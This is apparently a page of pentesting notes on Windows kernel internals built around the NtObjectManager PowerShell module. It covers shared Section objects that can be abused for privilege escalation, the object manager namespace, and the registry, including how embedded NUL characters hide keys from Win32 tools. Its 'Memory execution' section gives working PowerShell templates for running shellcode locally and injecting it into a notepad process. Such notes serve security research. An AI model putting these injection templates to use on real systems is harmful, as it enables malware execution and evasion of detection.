---
title: Kernel
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/security-internals/kernel
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

The Windows kernel contains multiple specific sections responsible for some part of the kernel. Not all sections are as interesting to a security researcher. The interesting ones among others are the Security Reference Monitor, Object Manager, Configuration Manager, Memory manager, I/O manager, Process and thread manager and Configuration manager.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FpV3icJxPGdB2mkUGZZOk%2Fimage.png?alt=media&amp;token=c9561abe-71de-4d7f-ab70-f49a47cfd4e4" alt=""><figcaption></figcaption></figure>

Most cmdlets used within these notes are from the [NtObjectManager ](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/main/NtObjectManager)PowerShell module

## Shared objects leading to privileged code execution

When you query the list of handles using the `Get-NtHandle` command, you also get the address of the object in kernel memory. When you open the same kernel object, you'll get different handles, but they will still point to the same kernel object address. You can use the object address to find processes that share handles.&#x20;

This can be interesting for security in cases when an object is shared between two processes at different privileges. The low-privileged process might be able to modify the properties of the object to bypass security checks in the higher privileged process, enabling it to gain additional privileges.\
\
The low-privileged process could map the shared Section to be writable and modify contents that the privileged process assumed couldn’t be modified. This could result in the low privileged process being able to modify arbitrary memory in the privileged process, resulting in privileged code execution.

{% code lineNumbers="true" %}

```powershell
$ss = Get-NtHandle -ObjectType Section -GroupByAddress | Where-Object ShareCount -eq 2
$mask = Get-NtAccessMask -SectionAccess MapWrite
$ss = $ss | Where-Object { Test-NtAccessMask $_.AccessIntersection $mask }
foreach($s in $ss) {
 $count = ($s.ProcessIds | Where-Object {
    Test-NtProcess -ProcessId $_ -Access DupHandle
 }).Count
 if ($count -eq 1) {
    $s.Handles | Select ProcessId, ProcessName, Handle
 }
}
```

{% endcode %}

On a default Windows install, you likely won't get any results, but third party software running could contain interesting mapped memory sections.

### Modify mapped memory

If you find an interesting Section object to modify, you can map it into memory using `Add-NtSection`. But how do  modify the mapped memory? The simplest approach from the command line is to use the `Write-NtVirtualMemory` command, which supports passing a mapped section and an array.

{% code lineNumbers="true" %}

```powershell
$handle = $null # Replace with a valid section object from NtObject:\.
$sect = $handle.GetObject()
$map = Add-NtSection -Section $sect -Protection ReadWrite
$random = Get-RandomByte -Size $map.Length
Write-NtVirtualMemory -Mapping $map -Data $random
Out-HexDump -Buffer $map -Length 16 -ShowAddress -ShowHeader
```

{% endcode %}

## Memory execution

There are different ways to allocate a memory space and execute it.

### Within normal space

{% code lineNumbers="true" %}

```powershell
# Shellcode buffer
[Byte[]] $buf = 0xfc,0x48,0x83,[..]

# Add new memory space
$addr = Add-NtVirtualMemory -Size $buf.Length -Protection ReadWrite

# Write shellcode to address
Write-NtVirtualMemory -Address $addr -Data $buf

# Set address to execute read
Set-NtVirtualMemory -Address $addr -Protection ExecuteRead -Size $buf.Length

# Get current process
$proc = Get-NtProcess -Current

# Start new thread with base address containing shellcode in our current process
$thread = New-NtThread -StartRoutine $addr -Process $proc
```

{% endcode %}

### Within section objects

One way is to use sections. The following example gets our current process, creates a new section object with Execute Read Write privileges, maps it to our current process, writes the memory and executes the thread.

{% code lineNumbers="true" %}

```powershell
# Shellcode buffer
[Byte[]] $buf = 0xe8,0x53,0xde,0x03,[..]

#Start in current process
$proc = Get-NtProcess -Current

#Create a new section
$section = New-NtSection -Size $buf.Length -Protection ExecuteReadWrite

#Map the section to the current process
$localmap = Add-NtSection -Section $section -Protection ExecuteReadWrite -Process $(Get-NtProcess -pid $PID)

#Write shellcode to the local mapped section
Write-NtVirtualMemory -Address $localmap.BaseAddress -Data $buf

#Create a new thread to execute the shellcode
$thread = New-NtThread -StartRoutine $localmap.BaseAddress -Process $proc
```

{% endcode %}

We can also select a remote process instead using mapping:

{% code lineNumbers="true" %}

```powershell
# Shellcode buffer
[Byte[]] $buf = 0xe8,0x53,0xde,0x03,[..]

#Create a new notepad process
$proc = New-Win32Process -CommandLine "notepad.exe"

#Create a new section
$section = New-NtSection -Size $buf.Length -Protection ExecuteReadWrite

#Map the section to the current process and the remote notepad process
$localmap = Add-NtSection -Section $section -Protection ReadWrite -Process $(Get-NtProcess -pid $PID)
$remotemap = Add-NtSection -Section $section -Protection ExecuteReadWrite -Process $proc

#Write shellcode to the local mapped section
Write-NtVirtualMemory -Address $localmap.BaseAddress -Data $buf

#Create a new thread to execute the shellcode
$thread = New-NtThread -StartRoutine $remotemap.BaseAddress -Process $proc
```

{% endcode %}

## Object manager

In Linux, everything is a file. In Windows everything is a object, meaning that every file, process, and thread is represented in kernel memory as an object structure. The Object manager is responsible for managing these objects.&#x20;

### Object Manager Name Space (OMNS)

As a user of Windows, you typically see just your filesystem drives in Explorer. But underneath the user interface is a whole additional filesystem just for kernel objects. Access to this filesystem, referred to as the object manager namespace (OMNS), isn’t very well documented or exposed to most developers, which makes it even more interesting. Each directory is configured with a security descriptor that\
determines which users can list its contents and which users can create new sub-directories and objects.

```powershell
ls NtObject:\ | Sort-Object Name

Name
----
ArcName
BaseNamedObjects
BindFltPort
Callback
CLDMSGPORT
clfs
```

Windows pre-configures several important object directories like `NtObject:\RPC Control\` which is the directory for [Remote Procedure Call](/pentesting-notes/windows-pentesting/security-internals/remote-procedure-call.md) endpoints.

```powershell
ls 'NtObject:\RPC Control\'

Name                                                                                           TypeName
----                                                                                           --------
OLE2E3EB50DD81C5732B7B7D24DD1FC                                                                ALPC Port
OLEBBA38A39DE3938B3067DE09BC188                                                                ALPC Port
OLE2E04F85023B9BF1A02C2F544A0FF                                                                ALPC Port
```

Or the `NtObject:\Device` directory, containing devices such as mounted filesystems.

```powershell
ls 'NtObject:\Device\'

Name                                                           TypeName
----                                                           --------
{2b6ba339-70d9-47b8-89fd-4d77779b8072}                         SymbolicLink
000000b3                                                       Device
0000007e                                                       Device
0000006a                                                       Device
00000058                                                       Device
GPIO_1                                                         Device
NTPNP_PCI0030                                                  Device
NTPNP_PCI0002                                                  Device
```

## The configuration manager (registry)

The configuration manager, known more commonly as the registry, is an important component for configuring the operating system. It stores a variety of configuration information, ranging from the system-critical list of available I/O manager device drivers to the (less critical) last position on screen of your text editor's window.

You can access it through the OMNS, although you must use registry-specific system calls. The root of the registry is the OMNS path `\REGISTRY`.

```powershell
ls NtObject:\REGISTRY

Name    TypeName
----    --------
A       Key
MACHINE Key
USER    Key
WC      Key
```

Note that PowerShell already comes with a drive provider that you can use to access the registry. However, this drive provider exposes only the Win32 view of the registry, which hides the internal details about the registry from view.

```powershell
$key = Get-NtKey \Registry\Machine\SOFTWARE\Microsoft\.NETFramework
Get-NtKeyValue -Key $key

Name        Type   DataObject
----        ----   ----------
Enable64Bit Dword  1
InstallRoot String C:\Windows\Microsoft.NET\Framework64\
UseRyuJIT   Dword  1
```

the PowerShell module's drive provider allows you to view the entire registry. It also uses the native APIs, which use counted strings, and supports the use of NUL characters in the names of the registry keys and values, while the  APIs uses NUL-terminated C-style strings, which cannot handle embedded\
NUL characters. Therefore, if a NUL is embedded into a name, it’s impossible for the built-in provider to access that key or value.

```powershell
$key = New-NtKey -Win32Path "HKCU\ABC`0XYZ"
Get-Item "NtKeyUser:\ABC`0XYZ"

Name    TypeName
----    --------
ABCXYZ Key

Get-Item "HKCU:\ABC`0XYZ"
Get-Item : Cannot find path 'HKCU:\ABCXYZ' because it does not exist.
At line:1 char:1
+ Get-Item "HKCU:\ABC`0XYZ"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (HKCU:\ABCXYZ:String) [Get-Item], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
```

This behavior of the Win32 APIs can lead to security issues. For example, it’s possible for malicious code to hide registry keys and values from any software that uses the Win32 APIs. This can prevent the malicious code from being detected.
